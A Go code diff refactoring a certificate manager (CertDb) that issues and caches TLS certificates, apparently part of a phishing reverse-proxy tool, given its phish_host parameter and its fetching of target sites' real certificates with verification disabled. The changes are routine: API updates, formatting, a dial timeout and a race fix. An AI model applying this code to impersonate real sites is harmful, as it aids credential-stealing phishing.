@@ -9,8 +9,8 @@ import (
 	"crypto/x509/pkix"
 	"encoding/pem"
 	"fmt"
-	"io/ioutil"
 	"math/big"
+	"net"
 	"os"
 	"path/filepath"
 	"strings"
@@ -23,15 +23,15 @@ import (
 )
 
 type CertDb struct {
-	cache_dir      string
-	magic          *certmagic.Config
-	cfg            *Config
-	ns             *Nameserver
-	caCert         tls.Certificate
-	tlsCache       map[string]*tls.Certificate
-	tlsCacheMu     sync.RWMutex
-	wildcardCache  map[string]bool // Track domains that should use wildcards
-	dnsChallenge   bool            // Whether DNS challenge is enabled
+	cache_dir     string
+	magic         *certmagic.Config
+	cfg           *Config
+	ns            *Nameserver
+	caCert        tls.Certificate
+	tlsCache      map[string]*tls.Certificate
+	tlsCacheMu    sync.RWMutex
+	wildcardCache map[string]bool // Track domains that should use wildcards
+	dnsChallenge  bool            // Whether DNS challenge is enabled
 }
 
 func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver) (*CertDb, error) {
@@ -62,7 +62,7 @@ func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver) (*CertDb, error) {
 	}
 
 	o.magic = certmagic.NewDefault()
-	
+
 	// Initialize DNS provider if configured
 	if err := o.initDNSProvider(); err != nil {
 		log.Warning("Failed to initialize DNS provider: %v", err)
@@ -90,9 +90,9 @@ func (o *CertDb) GetEmail() string {
 func (o *CertDb) generateCertificates() error {
 	var key *rsa.PrivateKey
 
-	pkey, err := ioutil.ReadFile(filepath.Join(o.cache_dir, "private.key"))
+	pkey, err := os.ReadFile(filepath.Join(o.cache_dir, "private.key"))
 	if err != nil {
-		pkey, err = ioutil.ReadFile(filepath.Join(o.cache_dir, "ca.key"))
+		pkey, err = os.ReadFile(filepath.Join(o.cache_dir, "ca.key"))
 	}
 
 	if err != nil {
@@ -107,7 +107,7 @@ func (o *CertDb) generateCertificates() error {
 			Type:  "RSA PRIVATE KEY",
 			Bytes: x509.MarshalPKCS1PrivateKey(key),
 		})
-		err = ioutil.WriteFile(filepath.Join(o.cache_dir, "ca.key"), pkey, 0600)
+		err = os.WriteFile(filepath.Join(o.cache_dir, "ca.key"), pkey, 0600)
 		if err != nil {
 			return err
 		}
@@ -123,7 +123,7 @@ func (o *CertDb) generateCertificates() error {
 		}
 	}
 
-	ca_cert, err := ioutil.ReadFile(filepath.Join(o.cache_dir, "ca.crt"))
+	ca_cert, err := os.ReadFile(filepath.Join(o.cache_dir, "ca.crt"))
 	if err != nil {
 		notBefore := time.Now()
 		aYear := time.Duration(10*365*24) * time.Hour
@@ -159,7 +159,7 @@ func (o *CertDb) generateCertificates() error {
 			Type:  "CERTIFICATE",
 			Bytes: cert,
 		})
-		err = ioutil.WriteFile(filepath.Join(o.cache_dir, "ca.crt"), ca_cert, 0600)
+		err = os.WriteFile(filepath.Join(o.cache_dir, "ca.crt"), ca_cert, 0600)
 		if err != nil {
 			return err
 		}
@@ -176,7 +176,7 @@ func (o *CertDb) setManagedSync(hosts []string, t time.Duration) error {
 	// Process hosts to determine which should use wildcard certificates
 	processedHosts := []string{}
 	wildcardDomains := make(map[string]bool)
-	
+
 	for _, host := range hosts {
 		if o.isWildcardDomain(host) {
 			wildcardDomain := o.getWildcardDomain(host)
@@ -191,23 +191,23 @@ func (o *CertDb) setManagedSync(hosts []string, t time.Duration) error {
 			o.wildcardCache[host] = false
 		}
 	}
-	
+
 	// Configure certmagic for this operation
 	if o.dnsChallenge && len(wildcardDomains) > 0 {
 		// Log that wildcard certificates are requested but need DNS provider
 		log.Warning("Wildcard certificates requested but DNS challenge provider not fully integrated")
 		log.Info("Falling back to regular certificates for now")
-		
+
 		// For now, use regular certificates instead of wildcards
 		processedHosts = hosts
 	}
-	
+
 	ctx, cancel := context.WithTimeout(context.Background(), t)
 	err := o.magic.ManageSync(ctx, processedHosts)
 	cancel()
-	
+
 	// No special error handling needed since we're using regular certificates for now
-	
+
 	return err
 }
 
@@ -228,7 +228,7 @@ func (o *CertDb) initDNSProvider() error {
 	default:
 		return fmt.Errorf("unsupported DNS provider: %s", dnsConfig.Provider)
 	}
-	
+
 	return nil
 }
 
@@ -360,9 +360,15 @@ func (o *CertDb) reloadCertificates() error {
 func (o *CertDb) getTLSCertificate(host string, port int) (*x509.Certificate, error) {
 	log.Debug("Fetching TLS certificate for %s:%d ...", host, port)
 
-	config := tls.Config{InsecureSkipVerify: true, NextProtos: []string{"http/1.1"}}
-	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", host, port), &config)
+	dialer := &net.Dialer{Timeout: 10 * time.Second}
+	rawConn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
 	if err != nil {
+		return nil, err
+	}
+	tlsCfg := &tls.Config{InsecureSkipVerify: true, NextProtos: []string{"http/1.1"}}
+	conn := tls.Client(rawConn, tlsCfg)
+	if err := conn.Handshake(); err != nil {
+		rawConn.Close()
 		return nil, err
 	}
 	defer conn.Close()
@@ -452,7 +458,12 @@ func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port i
 	}
 
 	o.tlsCacheMu.Lock()
+	defer o.tlsCacheMu.Unlock()
+	// Re-check: another goroutine may have generated and cached this cert while
+	// we were doing the expensive TLS dial / key generation above.
+	if existing, ok := o.tlsCache[host]; ok {
+		return existing, nil
+	}
 	o.tlsCache[host] = cert
-	o.tlsCacheMu.Unlock()
 	return cert, nil
 }
